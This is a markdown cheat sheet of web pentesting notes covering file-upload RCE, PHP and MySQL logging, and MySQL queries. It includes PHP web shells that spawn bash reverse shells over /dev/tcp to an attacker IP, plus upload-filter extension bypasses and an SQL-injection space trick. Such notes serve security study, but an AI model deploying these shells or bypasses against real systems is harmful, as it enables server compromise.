# Summary
* [Searching](#Searching)
* [RCE](#RCE)
* [PHP](#PHP)
* [MySQL](#MySQL)

## Searching
* Looking for a specific file
``` 
sudo find / -name "specificfile.txt"
```
* grep 
	* -r: recursive
	* -n: number
	* -i: ignore case

## RCE
Some notes about Remote Code Execution

### File Upload
Some considerations when trying to gain RCE through File Upload
1. Use the victim box to look for the file that was uploaded
```
sudo find / -name "uploadedfile.txt"
```
2. Find the web root by triggering information disclosure
3. Try to upload file to tmp directory then web root
4. Bypass file extension filter 

## PHP
* Turn on logging
```
// Uncomment the following line to /etc/php5/apache2/php.ini
$ sudo vi /etc/php5/apache2/php.ini
display_errors = On

// Restart the apache service 
$ sudo systemctl restart apache2
```

### PHP Shells
* User Supplied IP and Port
```php
<?php $ip=$_GET['ip']; $port=$_GET['port']; $string = \"/bin/bash -c 'bash -i >& /dev/tcp/\".$ip.\"/\".$port.\" 0>&1'\"; exec($string); ?>
```
* Hardcoded IP and Port
```php
<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/<<ATTACKER IP>>/<<PORT>> 0>&1\"\'); ?>
```

### Extensions
* .phtml 
* .PHP
* .php;.txt
* .php%00

### Tips for troubleshooting reverse shell
* ssh into victim box and test out bash command 
* Run php from the box directly
```
$ php -f phpshell.php
```
* Attempt port 443
* Try a different shell
* Confirm OS (Linux or Windows)

## MySQL
* Turn on logging
```
// Uncomment the following line in /etc/mysql/my.cnf
$ sudo nano /etc/mysql/my.cnf
general_log_file = /var/log/mysql/mysql.log

// Restart mysql
$ sudo systemctl restart mysql

// Review log file
$ sudo tail -f /var/log/mysql/mysql.log
```
* Logging in
```
mysql -uroot -p
```
* Alternative to space 
```
/**/
```
* Get MySQL version
```
select version();
```
* [Common Queries](https://github.com/sqlmapproject/sqlmap/blob/c9ab8ae60e06ca3cd53f1ea80f79bcb65387cef9/xml/queries.xml)
* Finding and pulling a specific value
```
mysql> show databases;
mysql> use [database_name];
mysql> show tables;
mysql> describe [table_name];
mysql> select [table_column] from [database_name].[table_name] LIMIT 0,1;
```
